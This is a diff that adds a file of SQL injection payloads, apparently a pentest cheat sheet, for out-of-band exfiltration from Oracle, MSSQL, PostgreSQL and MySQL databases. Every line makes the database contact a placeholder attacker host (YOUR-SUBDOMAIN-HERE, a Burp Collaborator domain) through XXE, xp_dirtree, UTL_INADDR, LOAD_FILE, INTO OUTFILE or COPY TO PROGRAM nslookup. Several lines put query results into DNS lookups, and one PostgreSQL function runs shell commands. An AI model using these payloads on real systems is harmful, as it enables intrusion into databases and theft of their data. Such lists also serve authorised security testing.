@@ -1,0 +1,21 @@
+SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://YOUR-SUBDOMAIN-HERE/"> %remote;]>'),'/l') FROM dual
+SELECT UTL_INADDR.get_host_address('YOUR-SUBDOMAIN-HERE')
+exec master..xp_dirtree '//YOUR-SUBDOMAIN-HERE/a'
+copy (SELECT '') to program 'nslookup YOUR-SUBDOMAIN-HERE'
+LOAD_FILE('\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a')
+SELECT ... INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE\a'
+SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.YOUR-SUBDOMAIN-HERE"> %remote;]>'),'/l') FROM dual
+declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.YOUR-SUBDOMAIN-HERE/a"')
+
+create OR replace function f() returns void as $$
+declare c text;
+declare p text;
+begin
+SELECT into p (SELECT YOUR-QUERY-HERE);
+c := 'copy (SELECT '''') to program ''nslookup '||p||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net''';
+execute c;
+END;
+$$ language plpgsql security definer;
+SELECT f();
+
+SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE\a'
